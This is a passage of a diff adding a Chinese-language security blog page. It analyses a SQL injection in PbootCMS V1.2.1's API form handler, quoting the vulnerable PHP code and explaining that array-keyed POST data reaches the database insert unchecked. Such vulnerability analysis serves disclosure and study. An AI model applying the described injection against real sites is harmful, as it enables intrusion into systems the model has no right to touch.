+                    $data[$value-&gt;name] = post($value-&gt;name);
+                    $mail_body .= $value-&gt;description . &#39;：&#39; . post($value-&gt;name) . &#39;&lt;br&gt;&#39;;
+                &#125;
+            &#125;
+
+            // 设置创建时间
+            if ($data) &#123;
+                $data[&#39;create_time&#39;] = get_datetime();
+            &#125;
+
+            // 写入数据
+            if ($this-&gt;model-&gt;addForm($value-&gt;table_name, $data)) &#123;
+                $this-&gt;log(&#39;API提交表单数据成功！&#39;);
+                if ($this-&gt;config(&#39;message_send_mail&#39;) &amp;&amp; $this-&gt;config(&#39;message_send_to&#39;)) &#123;
+                    $mail_subject = &quot;【PbootCMS】您有新的表单数据，请注意查收！&quot;;
+                    $mail_body .= &#39;&lt;br&gt;来自网站&#39; . get_http_url() . &#39;（&#39; . date(&#39;Y-m-d H:i:s&#39;) . &#39;）&#39;;
+                    sendmail($this-&gt;config(), $this-&gt;config(&#39;message_send_to&#39;), $mail_subject, $mail_body);
+                &#125;
+                json(1, &#39;表单提交成功！&#39;);
+            &#125; else &#123;
+                $this-&gt;log(&#39;API提交表单数据失败！&#39;);
+                json(0, &#39;表单提交失败！&#39;);
+            &#125;
+        &#125; else &#123;
+            json(0, &#39;表单提交失败，请使用POST方式提交！&#39;);
+        &#125;
+    &#125;
+</code></pre>
+<p>可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部<br>POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组</p>
+<pre><code>然后就会带入 $this-&gt;model-&gt;addForm(data) 执行语句
+</code></pre>
+<p>文件：PbootCMS-V1.2.1\apps\api\model\CmsModel.php 方法：addForm(</p>
+<pre><code>// 新增表单数据
+public function addForm($table, $data)
+&#123;
+    return parent::table($table)-&gt;insert($data);
+&#125;
+</code></pre>
+<p>根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key<br>带入数据库查询引发注入</p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/lrqvqv">https://www.yuque.com/pmiaowu/bfgkkh/lrqvqv</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PbootCMS/PbootCMS%20sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qtjh00d9y8v1h6pi3wrs" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/PbootCMS/PbootCMS%20v2.0.7%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/PbootCMS/PbootCMS%20csrf/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
